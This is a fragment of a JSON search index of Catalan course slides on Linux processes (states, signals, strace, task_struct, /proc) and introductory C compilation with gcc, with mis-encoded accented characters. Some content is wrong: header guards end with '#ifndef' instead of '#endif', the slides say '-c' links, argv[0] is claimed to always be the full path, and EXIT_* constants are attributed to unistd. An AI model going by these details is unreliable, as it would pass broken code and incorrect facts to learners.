    "text": "Transicions d‚Äôestat: Finalitzant el proc√©s\nQuan el proc√©s es completi, invocar√† expl√≠citament o impl√≠citament a la crida a sistema exit, en conseq√º√®ncia passar√† a l‚Äôestat execuci√≥ en mode supervisor. Quan es completi aquesta crida a sistema passar√† finalment a l‚Äôestat zombi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d‚Äôestat?",
    "text": "Qui controla les transicions d‚Äôestat?\nUn proc√©s t√© control sobre algunes transicions d‚Äôestat. En primer lloc, un proc√©s pot crear un altre proc√©s. No obstant aix√≤, √©s el kernel qui decideix en quin moment es realitzen la transici√≥ des de l‚Äôestat creat a l‚Äôestat preparat per a execuci√≥ en mem√≤ria principal o a l‚Äôestat preparat per a execuci√≥ en mem√≤ria secund√†ria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-1",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-1",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d‚Äôestat?",
    "text": "Qui controla les transicions d‚Äôestat?\nUn proc√©s pot invocar una crida a sistema, el que provocar√† que passi de l‚Äôestat execuci√≥ en mode usuari a l‚Äôestat execuci√≥ en mode kernel. No obstant aix√≤, el proc√©s no t√© control de quan tornar√† d‚Äôaquest estat, fins i tot alguns esdeveniments poden produir que mai retorni i passi a l‚Äôestat zombi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-2",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-2",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d‚Äôestat?",
    "text": "Qui controla les transicions d‚Äôestat?\nUn proc√©s pot finalitzar realitzant una invocaci√≥ expl√≠cita de la crida a sistema exit, per√≤ d‚Äôaltra banda esdeveniments externs tamb√© poden fer que es produeixi l‚Äôacabament de l‚Äôproc√©s.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-3",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-3",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d‚Äôestat?",
    "text": "Qui controla les transicions d‚Äôestat?\nLa resta de les transicions d‚Äôestat segueixen un model r√≠gid codificat en el nucli. Per tant, el canvi d‚Äôestat d‚Äôun proc√©s davant l‚Äôaparici√≥ de certs esdeveniments es realitza d‚Äôacord a unes regles predefinides.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#exemples-pr√†ctics-i",
    "href": "slides/03-procs.html#exemples-pr√†ctics-i",
    "title": "Processos a Linux",
    "section": "Exemples pr√†ctics (I)",
    "text": "Exemples pr√†ctics (I)\n\n\n\nObrirem 2 terminal i ens connectarem a debian per ssh.\nAnirem al terminal 1 i crearem un proc√©s: sleep 120.\nAnirem al terminal 2 i observarem com el proc√©s sleep es troba en estat (S - Interruptible sleep).\nEn la terminal 1 clicarem control-z (aquesta combinaci√≥ serveix per aturar qualsevol proc√©s).\nAnirem al terminal 2 i observarem que l‚Äôestat del proc√©s sleep es (T - Stopped by job control signal).\nAnirem al terminal 1 i llen√ßarem l‚Äôorde bg. Aquesta orde llan√ßa el proc√©s pausat en segon pla (similar a executar-lo amb & al final, deixant el terminal lliure).\nAnirem al terminal 2 i observarem com el proc√©s sleep ha retornat a l‚Äôestat (S - Interruptible sleep).\n\n\nsleep 100\n^Z\n#Proc√©s aturat\nps -o pid,state,command  \nbg\n#Proc√©s espera esdeveniment\nps -o pid,state,command",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#exemples-pr√†ctics-ii",
    "href": "slides/03-procs.html#exemples-pr√†ctics-ii",
    "title": "Processos a Linux",
    "section": "Exemples pr√†ctics (II)",
    "text": "Exemples pr√†ctics (II)\n\n\n\nObrirem 1 terminal i ens connectarem a debian per ssh.\nCrearem un proc√©s en background: sleep 120 &\nObservarem com el proc√©s sleep es troba en estat (S - Interruptible sleep).\nEnviarem un senyal per aturar el proc√©s: kill -STOP {PID del proc√©s sleep}\nObservarem com el proc√©s sleep ha retornat a l‚Äôestat (T - stopped by job control signal).\nEnviarem un senyal per continuar l‚Äôexecuci√≥ del proc√©s: kill -CONT {PID del proc√©s sleep}\n\n\nman kill\nsleep 100 &\nps -o pid,state,command  \nkill -STOP {pid}\nps -o pid,state,command\nkill -CONT {pid}\nkill -KILL {pid}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#espiant-un-proc√©s-amb-strace",
    "href": "slides/03-procs.html#espiant-un-proc√©s-amb-strace",
    "title": "Processos a Linux",
    "section": "Espiant un proc√©s amb strace",
    "text": "Espiant un proc√©s amb strace\nEn una terminal executem un proc√©s. Per exemple:\n  sleep 120 &\nEn un altra terminal executem la seg√ºent instrucci√≥:\nstrace -f -p {pid}\n\nSi en l‚Äôoutput de la comanda observem que el proc√©s est√† parat en crides a sistema del tipus read() el proc√©s est√† esperant entrada de dades.\nEn altres casos, veurem quines s√≥n les crides a sistema que est√† realitzant el proc√©s.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#pcb-process-control-block",
    "href": "slides/03-procs.html#pcb-process-control-block",
    "title": "Processos a Linux",
    "section": "PCB (Process Control Block)",
    "text": "PCB (Process Control Block)\n\n\nEl PCB √©s una estructura de dades que permet al sistema operatiu supervisar i control un proc√©s.\n\nInformaci√≥ guardada al PCB:\n\nPunters.\nEstat del proc√©s.\nIdentificadors.\nTaula de fitxers oberts.\nRecursos assignats.\nContext dels registre de CPU.\nInformaci√≥ sobre la m√®moria.\nInformaci√≥ sobre la planificaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estructura-del-pcb-i",
    "href": "slides/03-procs.html#estructura-del-pcb-i",
    "title": "Processos a Linux",
    "section": "Estructura del PCB (I)",
    "text": "Estructura del PCB (I)\nEl PCB de Linux es defineix a struct task_struct al fitxer sched.h.\n\nvolatile long state: cont√© l‚Äôestat del proc√©s. Que la variable estigui declarada com volatile li indica a l‚Äôcompilador que el seu valor pot canviar-se de forma as√≠ncrona (per exemple des d‚Äôuna rutina de tractament d‚Äôinterrupci√≥).\nstruct thread_info * thread_infp: Cont√© informaci√≥ de baix nivell sobre el proc√©s: flags, estatus, cpu, domini d‚Äôexecuci√≥, etc.\nunsigned long flags: cont√© l‚Äôestat detallat de l‚Äôproc√©s dins el nucli. Representa el cicle de vida d‚Äôun proc√©s. Cada bit indica un possible esdeveniment i no s√≥n m√∫tuament exclusius.\nunsigned long ptrace: Informaci√≥ sobre la monitoritzaci√≥ un proc√©s.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estructura-del-pcb-ii",
    "href": "slides/03-procs.html#estructura-del-pcb-ii",
    "title": "Processos a Linux",
    "section": "Estructura del PCB (II)",
    "text": "Estructura del PCB (II)\n\nint exit_state, int exit_code, exit_signal: Contenen l‚Äôestat del proc√©s a l‚Äôacabar, el valor de terminaci√≥ d‚Äôun proc√©s, en cas que hi hagi finalitzat mitjan√ßant la crida a sistema exit (2) o, si acaba per un senyal, contindr√† el identificador de senyal que el va matar.\npid_t pid: Cont√© l‚Äôidentificador de l‚Äôproc√©s.\npid_t tpid: Cont√© l‚Äôidentificador del grup de processos. Coincideix amb l‚Äôidentificador de el lider de el grup.\nuid_t uid, euid, suid, fsuid: Usuari propietari d‚Äôaquest proc√©s, tant real (uid), com efectiu (euid), i atributs m√©s espec√≠fics.\ngid_t gid, Egid, sgid, fsgid: Grup propietari d‚Äôaquest proc√©s, tant real (gid), com efectiu (Egid), i atributs m√©s espec√≠fics.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#intercanvi-de-processos-i",
    "href": "slides/03-procs.html#intercanvi-de-processos-i",
    "title": "Processos a Linux",
    "section": "Intercanvi de processos (I)",
    "text": "Intercanvi de processos (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#intercanvi-de-processos-ii",
    "href": "slides/03-procs.html#intercanvi-de-processos-ii",
    "title": "Processos a Linux",
    "section": "Intercanvi de processos (II)",
    "text": "Intercanvi de processos (II)\nEl kernel gestiona una estructura de taula (diccionari) semblant a la representada en la imatge seg√ºent per poder accedir de forma eficient als diferents PCBs. Aquesta estrcutura de dades es coneix com a Taula PCB.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#proc",
    "href": "slides/03-procs.html#proc",
    "title": "Processos a Linux",
    "section": "/proc",
    "text": "/proc\n\n\n\ncmdline: Cont√© l‚Äôordre que comen√ßa el proc√©s, amb tots els seus par√†metres.\ncwd: Enlace simb√≤lic al directori de treball actual (directori de treball actual) del proc√©s.\nenviron: Cont√© totes les variables d‚Äôentorn per al proc√©s.\nfd: Cont√© els descriptors d‚Äôarxiu per al proc√©s, mostrant els fitxers o dispositius que estan utilitzant.\nmaps, statm i mem: Cont√© informaci√≥ relacionada amb la mem√≤ria en √∫s pel proc√©s.\nstat and status: Cont√© nformaci√≥ sobre l‚Äôestat del proc√©s.\n\n\n\n\nPer trobar la taula de processos necessitem observar la seg√ºent ruta: /proc:\nsleep 60 &\nless /proc/{pid}/stat\nless /proc/{pid}/environ",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/03-procs.html#aix√≤-√©s-tot-per-avui",
    "title": "Processos a Linux",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\nLa gesti√≥ de processos a Unix/Linux √©s crucial per a una utilitzaci√≥ eficient del sistema i una correcta assignaci√≥ de recursos. El directori /proc ofereix acc√©s als PCBs que contenen informaci√≥ sobre cada proc√©s en execuci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Processos"
    ]
  },
  {
    "objectID": "slides/01-c.html#desenvolupament-en-sistemes-linuxunix",
    "href": "slides/01-c.html#desenvolupament-en-sistemes-linuxunix",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Desenvolupament en sistemes Linux/UNIX",
    "text": "Desenvolupament en sistemes Linux/UNIX\nEl desenvolupament de programari de sistema el realitzarem amb els llenguatge C i basa en els compiladors GNU gcc.\n#!/bin/sh\n# ./check.sh\ngcc -v\nif [ $? != 0 ]; then\n       echo \"GCC is not installed!\"\nfi\nld -v\nif [ $? != 0 ]; then\n        echo \"Please install binutils!\"\nfi\n\nFitxer: scripts/check.sh\n\n\nPer poder desenvolupar en C en un sistema Linux/UNIX necessitem tenir instal¬∑lat el compilador GCC i les eines de binutils. Aquestes eines s√≥n necess√†ries per a la compilaci√≥ i enlla√ßat dels programes. Per comprovar si tenim instal¬∑lat aquestes eines podem executar el script anterior. Si no tenim instal¬∑lat aquestes eines, podem instal¬∑lar-les amb la comanda sudo apt-get install build-essential en sistemes basats en Debian o sudo dnf groupinstall \"Development Tools\" en sistemes basats en RedHat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#navegant-a-les-entranyes-del-compilador-gcc",
    "href": "slides/01-c.html#navegant-a-les-entranyes-del-compilador-gcc",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Navegant a les entranyes del compilador GCC",
    "text": "Navegant a les entranyes del compilador GCC\n\n\n\n\n\n\n\nEls llenguatges de programaci√≥ compilats s√≥n aquells que es tradueixen a codi m√†quina abans de l‚Äôexecuci√≥. Aquest proc√©s de traducci√≥ es realitza per un programa anomenat compilador. El compilador √©s un programa que tradueix el codi font d‚Äôun programa escrit en un llenguatge de programaci√≥ de nivell alt a codi m√†quina. En el cas de C, hi ha diferents etapes codi, ensamblador i enlla√ßador. El compilador GCC √©s un compilador de codi obert que es pot utilitzar per a la compilaci√≥ de programes en C, C++, Fortran, Ada, etc. Aquest compilador √©s molt potent i permet la compilaci√≥ de programes en diferents plataformes. A m√©s, el compilador GCC √©s molt flexible i permet la configuraci√≥ de diferents opcions de compilaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-i",
    "href": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (I)",
    "text": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (I)\nPreprocessador\n\nEl preprocessador processa el codi font, buscant instruccions que comencen amb un hash (#), com #include, #define, i #ifdef.\nInclou fitxers d‚Äôencap√ßalament (headers) i substitueix macros i definicions. Tamb√© elimina els comentaris.\nGenera un fitxer de codi font amb les instruccions del preprocessador processades, preparat per a la compilaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-ii",
    "href": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (II)",
    "text": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (II)\nCompilador\n\nTradu√Øx el codi font al assemblador equivalent. En alguns compiladors, el codi es pot convertir directament en codi m√†quina en aquesta etapa.\nTraduir el codi de nivell alt a codi de nivell baix i optimitzar-lo per al maquinari subjacent.\nGenera un fitxer de codi assemblador amb l‚Äôextensi√≥ .s. Per exemple, si el fitxer de codi font √©s hola.c, el fitxer generat seria hola.s.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-iii",
    "href": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-iii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (III)",
    "text": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (III)\nAssemblador\n\nConverteix el codi assemblador en codi objecte o codi de m√†quina.\nProduir codi binari que pugui ser ent√®s per la CPU.\nGenera un fitxer de codi objecte amb l‚Äôextensi√≥ .o. Per exemple, el fitxer resultant seria hola.o.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-iv",
    "href": "slides/01-c.html#etapes-de-la-compilaci√≥-i-lenlla√ß-iv",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (IV)",
    "text": "Etapes de la compilaci√≥ i l‚Äôenlla√ß (IV)\nEnlla√ßador (Linker)\n\nEnlla√ßa el codi objecte amb les biblioteques necess√†ries per crear l‚Äôexecutable final.\nOrganitzar i combinar el codi objecte i les biblioteques, resolent les refer√®ncies externes.\nGenera l‚Äôexecutable final, que √©s el fitxer que podeu executar. Per exemple, hola.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-etapes",
    "href": "slides/01-c.html#exemple-etapes",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: Etapes",
    "text": "Exemple: Etapes\n\n\n#include &lt;stdio.h&gt;\n\n#define x 10\n#define y 5\n\nint \nmain(){\n  printf(\"El resultat de l'opearci√≥: \n      %d + %d = %d\\n\", x,y,x+y);\n    return 0;\n}\n\nFitxer: sources/ex1.c\n\n\n\nExecutable: gcc -o ex1 ex1.c\nAssemblador: gcc -S -o ex1.s ex1.c\nCodi objecte: gcc -c -o ex1.o ex1.c\nPreprocessador: gcc -E -o ex1.i ex1.c\nDesensamblador: objdump -d ex1.o o objdump -d -M intel ex1\n\n\n\n\n\n\n\n\n\nNotes\n\n\n\n-M intel indica l‚Äô√∫s de la sintaxi Intel per a una millor llegibilitat.\nTots aquests fitxers generats els posarem al .gitignore.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funciona-el-compilador-gcc",
    "href": "slides/01-c.html#com-funciona-el-compilador-gcc",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Com funciona el compilador GCC?",
    "text": "Com funciona el compilador GCC?\ngcc &lt;codi&gt; -g -c &lt;codi&gt; -o &lt;executable&gt; -I &lt;dirIncludes&gt; -L &lt;dirLibs&gt;\n\n-g: Genera informaci√≥ de depuraci√≥.\n-c: Enlla√ßa nom√©s el fitxer especificat.\n-o: Fitxer executable de sortida (per defecte a a.out).\n-I: Directoris on es cercaran els fitxers .h.\n-L: Directoris on es cercaran les biblioteques.\n-l: Biblioteques a enlla√ßar.\n-Wall: Mostra tots els missatges d‚Äôadvert√®ncia.\n-Werror: Converteix els missatges d‚Äôadvert√®ncia en errors.\n-Wextra: Mostra missatges d‚Äôadvert√®ncia addicionals.\n‚Ä¶: Altres opcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#el-nostre-primer-programa-hola-m√≥n",
    "href": "slides/01-c.html#el-nostre-primer-programa-hola-m√≥n",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "El nostre primer programa: Hola m√≥n",
    "text": "El nostre primer programa: Hola m√≥n\n\n\n\nPreprocessador: El fitxer stdio proporciona la definici√≥ de la funci√≥ printf.\nmain(): Funci√≥ principal i obligat√≤ria. Aquesta no rep cap argument i retorna un enter.\nLa funci√≥ printf rep un argument del tipus char *.\nreturn 0: Indica que tot ha anat b√© i acaba la funci√≥ main().\n\n\n#include &lt;stdio.h&gt;\n/* This is a comment */\nint main()\n{\n    printf(\"Hola m√≥n!\\n\");\n    return 0;\n}\n\n# Compilem hola.c\ngcc -o hola hola.c \n# Executem hola\n./hola \n\n\nLa funci√≥ printf es troba a la biblioteca est√†ndard de C, podem consultar man s3 printf per obtenir m√©s informaci√≥. Aquesta funci√≥ permet mostrar text per pantalla. Els arguments que rep s√≥n una cadena de car√†cters i els valors que volem mostrar. Els valors es substitueixen a la cadena de car√†cters mitjan√ßant el format %d per a enters, %f per a nombres en punt flotant, %c per a car√†cters i %s per a cadenes de car√†cters. Els car√†cters \\n indiquen un salt de l√≠nia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#el-nostre-primer-programa-amb-llibreries-externes",
    "href": "slides/01-c.html#el-nostre-primer-programa-amb-llibreries-externes",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "El nostre primer programa amb llibreries externes",
    "text": "El nostre primer programa amb llibreries externes\n#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\nint main (void)\n{\n  double x = 2.0;\n  double y = sqrt (x);\n  printf (\"La rai¬≠z cuadrada de %f es %f\\n\", x, y);\n  return 0;\n}\n\nFitxer: sources/arrel.c\n\n// Complilaci√≥ amb ruta global a la llibreria\ngcc -Wall SO_usingLibraries.c /usr/lib/x86_64-linux-gnu/libm.a -o calc\n// Compilaci√≥ utilitzant la forma abreujada\ngcc -Wall SO_usingLibraries.c -lm -o calc\n\nPer obtenir informaci√≥ sobre la funci√≥ sqrt podeu consultar la p√†gina de manual amb la comanda man -s3 sqrt. Aquesta funci√≥ es troba a la biblioteca matem√†tica, per aix√≤ cal enlla√ßar-la amb el programa. Per aix√≤ s‚Äôutilitza l‚Äôopci√≥ -lm. Quan compilem un programa en C, el compilador pot incorporar certes funcions de la biblioteca est√†ndard de forma autom√†tica perqu√® s√≥n part de les especificacions del llenguatge (com printf, scanf, etc.). No obstant aix√≤, altres funcions, com les de la biblioteca matem√†tica, no es troben dins d‚Äôaquest conjunt i, per tant, cal especificar manualment que volem enlla√ßar-les amb el programa.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-calculadora-i",
    "href": "slides/01-c.html#activitat-calculadora-i",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Activitat: Calculadora (I)",
    "text": "Activitat: Calculadora (I)\n\n\n// calc.h\n#ifndef CALC_H\n#define CALC_H\n\ndouble suma(\n  double a, \n  double b);\n\n#ifndef CALC_H\n\n// calc.c\n#include \"calc.h\"\n\ndouble suma(\n  double a, \n  double b) \n  {\n    return a + b;\n  }\n\n#include &lt;stdio.h&gt;\n#include \"calc.h\"\n\nint main() {\n  double a = 2.0;\n  double b = 3.0;\n  suma(a, b);\n  return 0;\n}\n\n\ngcc -c calc.c -o calc.o\ngcc -c main.c -o main.o\ngcc calc.o main.o -o calc\n./calc",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-calculadora-ii",
    "href": "slides/01-c.html#activitat-calculadora-ii",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Activitat: Calculadora (II)",
    "text": "Activitat: Calculadora (II)\n\n\n// calc.h\n#ifndef CALC_H\n#define CALC_H\n\ndouble potencia(\n  double a, \n  double b);\n\n#ifndef CALC_H\n\n// calc.c\n#include \"calc.h\"\n#include &lt;math.h&gt;\ndouble potencia(\n  double a, \n  double b) \n  {\n    return pow(a, b);\n  }\n\n#include &lt;stdio.h&gt;\n#include \"calc.h\"\n\nint main() {\n  double a = 2.0;\n  double b = 3.0;\n  potencia(a, b);\n  return 0;\n}\n\n\ngcc -c calc.c -o calc.o\ngcc -c main.c -o main.o\ngcc calc.o main.o -o calc -lm\n./calc",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#els-arguments-dentrada",
    "href": "slides/01-c.html#els-arguments-dentrada",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Els arguments d‚Äôentrada",
    "text": "Els arguments d‚Äôentrada\nLa funci√≥ main() t√© dos arguments que tradicionalment s‚Äôanomenen argc (Longitud del vector d‚Äôargument) i argv (Matriu de punters de car√†cters).\n\n\nRetorna un enter\n\n0: En cas d‚Äô√®xit.\n-1 (negatiu): en cas de fallada.\n\n\nint \nmain(int argc, \n     char *argv[]) \n{...}\n\n./a.out -o foo -vv\nargv = [ \"/path/to/a.out\", \n  \"-o\" \"foo\", \"-vv\" ];\n\n\nArgv √©s una representaci√≥ tokenitzada.\nArgv[0] mai est√† buit i sempre cont√© la ruta completa a l‚Äôexecutable.\n\n\nCom ja hem vist la funci√≥ main() √©s la primera funci√≥ del vostre programa que s‚Äôexecuta quan comen√ßa a executar-se. Aquesta funci√≥ crida a **_start()**, que normalment proporciona la biblioteca de temps d‚Äôexecuci√≥ C, enlla√ßat autom√†ticament quan es compila el programa.\nLa funci√≥ main() t√© dos arguments que tradicionalment s‚Äôanomenen argc (Longitud del vector d‚Äôargument) i argv (Matriu de punters de car√†cters) i retorna un nombre enter amb signe. La majoria dels entorns Unix esperen que els programes tornin 0 (zero) en cas d‚Äô√®xit i -1 (negatiu) en cas de fallada.\nArgv √©s una representaci√≥ tokenitzada de la l√≠nia d‚Äôordres que va invocar el vostre programa. Argv[0] mai est√† buit i sempre cont√© la ruta completa a l‚Äôexecutable.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-check_args.c",
    "href": "slides/01-c.html#exemple-check_args.c",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Exemple: check_args.c",
    "text": "Exemple: check_args.c\n\n\n#include &lt;stdio.h&gt;\n\nint\nmain(int argc, char **argv) {\n\n  int i;\n\n  for (i=0; i&lt;argc; i++) {\n    printf(\"%s\\n\", argv[i]);\n  }\n\n  return 0;\n}\n\ngcc check_args.c -o check_args\n./check_args a.out\n./check_args *.c\n./check_args $USER $PWD $SHELL\n\n\nAquest programa ens permet observa com es capturen els arguments.\nAra executarem aquest programa amb els diferents tipus de shell que tenim instal¬∑lades.\nPer modificar la shell: chsh -s /bin/sh jordi.\n\n\n\nFitxer: sources/check_args.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#include",
    "href": "slides/01-c.html#include",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Include",
    "text": "Include\nEn el llenguatge de programaci√≥ C, la directiva #include diu al preprocessador que insereixi el contingut d‚Äôun altre fitxer al codi font en el punt on es trobi la directiva #include.\n\n#include &lt;header_file&gt;: El preprocessador cercar√† una ruta de directori predeterminada per localitzar el fitxer de cap√ßalera. Normalment, els fitxers s√≥n: /usr/include.\n#include \"header_file\": El preprocessador buscar√† el fitxer de cap√ßalera al mateix directori que el fitxer font",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#include-header-m√©s-improtants",
    "href": "slides/01-c.html#include-header-m√©s-improtants",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Include: Header m√©s improtants",
    "text": "Include: Header m√©s improtants\n\n\n\n\n\n\n\nHeader\nFuncionalitat\n\n\n\n\nstdio\nSubministra entrada i sortida: funcions FILE, stdin, stdout, stderr i fprint().\n\n\nstdlib\nSubministra funcions d‚Äôutilitat: malloc(), calloc() i realloc().\n\n\nunistd\nSubministraments EXIT_FAILURE, EXIT_SUCCESS.\n\n\nerrno\nDefineix la variable errno externa i tots els valors que pot prendre.\n\n\nassert\nSubministra funcions de diagn√≤stic.\n\n\ntime\nSubministraments Funcions de data i hora.\n\n\nmath\nProporciona funcions de suport matem√†tiques.\n\n\nstring\nProporciona funcions memcpy(), memset() i strlen().\n\n\ngetopt\nProporciona optarg, opterr i getopt() externs.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#define",
    "href": "slides/01-c.html#define",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "Define",
    "text": "Define\nLa directiva #define permet la definici√≥ de macros dins del codi font. Aquestes definicions de macro permeten declarar valors constants per utilitzar-los en tot el codi. Les definicions de macro no s√≥n variables i el programa no les pot canviar. Utilitzeu aquesta sintaxi quan creeu constants que representen nombres, cadenes o expressions.\n\n\n#definir el valor CNAME\n#definir CNAME (expressi√≥)\n\n#define DEFAULT_PROGNAME \"myProgName\"\n#define BUFSIZE 4096\n\n\nL‚Äôexpressi√≥ s‚Äôha d‚Äôentregar entre par√®ntesis si cont√© operadors.\nNO poseu ; al final de les sent√®ncies #define.\nQuan s‚Äôanomena un #define per distingir-lo dels noms de variables i funcions, utilitzeu maj√∫scules.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ a la programaci√≥ de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#external-declarations",
    "href": "slides/01-c.html#external-declarations",
    "title": "Introducci√≥ a la programaci√≥ de Sistema (I) (C)",
    "section": "External declarations",
